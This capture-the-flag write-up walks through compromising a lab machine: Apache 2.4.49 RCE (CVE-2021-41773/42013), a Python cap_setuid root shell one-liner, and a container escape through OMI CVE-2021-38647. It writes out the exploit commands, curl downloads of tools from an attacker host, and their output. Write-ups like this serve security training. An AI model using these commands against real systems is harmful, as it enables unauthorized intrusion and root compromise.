**Difficulty:** Medium

## Reconnaissance

Running a standard nmap scan revealed two open ports:
```bash
nmap -sC -sV -oN nmap.txt MACHINE_IP -T4
```

**Port 22** OpenSSH 8.2p1 Ubuntu
**Port 80** Apache httpd 2.4.49 (Unix)

Directory fuzzing with ffuf found some interesting paths:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ -u http://MACHINE_IP/FUZZ
```

`.htaccess` 
`.htpasswd` 
`cgi-bin/`

## Initial Access

The website itself didn't reveal much, but after some research I found that the Apache version **2.4.49** is known to be vulnerable to path traversal and remote code execution.

**Vulnerability:** CVE-2021-41773 / CVE-2021-42013  
**Exploit:** [Apache RCE by blackn0te](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)
```bash
python3 exploit.py MACHINE_IP 80 rce 'id'
# uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

We're in as `daemon`

## Privilege Escalation

Time to enumerate the system. I uploaded linPEAS for automated enumeration:
```bash
# On attacker machine
python3 -m http.server 8000

# On target
curl http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee out.txt
```

### Python Capabilities

LinPEAS discovered something interesting - Python has the `cap_setuid` capability:
```bash
/usr/bin/python3.7 = cap_setuid+ep
```

This capability allows us to change the process UID to root. Let's exploit it:
```bash
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Root privileges achieved in the container! The first flag is located in `/root`:

```bash
cd /root
cat user.txt
THM{REDACTED}
```
### Escaping the Container

After reviewing the LinPEAS output, I identified the container IP as `172.17.0.2`, indicating the host is likely at `172.17.0.1`.
I transferred a static nmap binary to scan the host from within the container:

```bash
# On attacker machine
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
python3 -m http.server 8000
# On target
curl http://ATTACKER_IP:8000/nmap -o nmap
chmod +x nmap
./nmap 172.17.0.1 -p 1-10000 -sS -v -T4
```

**Results** 
``` 
5985/tcp closed unknown
5986/tcp open   unknown
```

Ports 5985/5986 indicated the **Microsoft OMI (Open Management Infrastructure)** service was running, which is vulnerable to **CVE-2021-38647** - an unauthenticated remote code execution vulnerability.

```bash
# On attacker machine
wget https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/main/omigod.py
python3 -m http.server 8000
# On target
curl http://ATTACKER_IP:8000/omigod.py -o omigod.py
python3 omigod.py -t 172.17.0.1 -c "cat /root/root.txt"
```

Successfully exploited the OMI service to escape the container and obtain the root flag from the host system!